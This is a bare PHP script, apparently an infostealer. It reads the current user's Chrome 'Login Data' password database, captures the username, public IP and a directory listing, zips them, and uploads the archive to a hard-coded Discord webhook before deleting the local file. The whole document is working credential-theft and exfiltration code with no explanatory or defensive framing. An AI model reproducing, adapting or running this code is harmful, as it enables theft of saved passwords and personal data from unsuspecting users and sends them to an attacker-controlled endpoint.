<?php
$username = get_current_user();
function getPublicIPAddress() {
    $ip = file_get_contents('https://api.ipify.org');
    return $ip;
}
$ip = getPublicIPAddress();
$passwords = file_get_contents('C:\Users\\' . $username . '\AppData\Local\Google\Chrome\User Data\Default\Login Data');// Function to get the public IP address
$dir = shell_exec('dir');

$zip = new ZipArchive('', ZIPARCHIVE::CREATE);
$zipname = 'data.zip';
$zip->open($zipname, ZipArchive::CREATE);

$zip->addFromString('username.txt', $username);
$zip->addFromString('ip.txt', $ip);
$zip->addFromString('passwords.txt', $passwords);
$zip->addFromString('dir.txt', $dir);

$zip->close();

$webhookURL = 'https://discord.com/api/webhooks/1167393887271268382/S42jNDg2MQK19lh6um4RKcN7c_LHbGgO1d3nsN-TSmd8tfN5P9FD49chJVNoLR6u5xUD';
$file = curl_file_create($zipname, 'application/zip', 'data.zip');
$data = array('file' => $file);
$ch = curl_init($webhookURL);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

unlink($zipname);

echo 'done';
?>  